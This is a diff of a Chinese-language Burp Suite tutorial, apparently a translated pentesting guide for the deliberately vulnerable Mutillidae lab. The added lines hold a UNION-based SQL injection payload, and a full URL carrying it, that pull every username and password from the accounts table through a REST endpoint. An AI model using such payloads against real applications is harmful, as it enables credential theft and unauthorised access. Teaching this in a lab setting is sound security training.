@@ -322,7 +322,9 @@
 
 1.  在 Burp 的**Repeater**中，将`?`添加到 URL 后面，然后加上参数名/值对`username=user`。新的 URL 应该如下所示：
 
-[PRE0]
+```
+/mutillidae/webservices/rest/ws-user-account.php?username=user
+```
 
 ![](img/00174.jpeg)
 
@@ -334,11 +336,15 @@
 
 1.  在`username=`后附加以下值：
 
-[PRE1]
+```
+user'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts+--+
+```
 
 新的 URL 应该是以下一个：
 
-[PRE2]
+```
+/mutillidae/webservices/rest/ws-user-account.php?username=user'+union+select+concat('The+password+for+',username,'+is+',+password),mysignature+from+accounts+--+
+```
 
 1.  在更改`username`参数后，单击**Go**按钮。您的请求应如下所示：
 
